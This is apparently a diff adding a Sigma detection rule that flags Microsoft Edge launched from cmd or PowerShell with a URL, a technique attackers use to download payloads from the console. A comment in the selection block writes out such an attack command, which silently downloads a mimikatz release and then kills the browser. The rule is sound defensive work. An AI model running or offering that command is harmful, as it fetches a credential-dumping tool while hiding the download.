@@ -1,0 +1,32 @@
+title: Edge abuse for payload download via console
+description: Detects scenarios where an attacker attemptes to download a payload directly via console.
+references:
+- https://github.com/mdecrevoisier/EVTX-to-MITRE-Attack/tree/master/TA0002-Execution/T1204-User%20execution
+- https://twitter.com/mrd0x/status/1478116126005641220?t=i4vTR5m1ocBY6oHZfjdn1Q&s=09
+tags:
+- attack.execution
+- attack.t1204
+author: mdecrevoisier
+status: experimental
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection: # start /min msedge.exe https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip && timeout 10 && taskkill /IM "msedge.exe" /F
+    EventID: 4688
+    Version: 2 # parent process name is available starting Windows 10 / Server 2016 and higher
+    ParentProcessName|endswith:
+      - \cmd.exe
+      - \powershell.exe
+      - \pwsh.exe
+    NewProcessName|endswith: \msedge.exe
+    CommandLine|contains:
+      - 'http://'
+      - 'https://'
+      - 'ftp://'
+      - 'www.'
+  condition: selection
+falsepositives:
+- Shortcuts to website (--pin-url)
+- Websites launched from console
+level: high
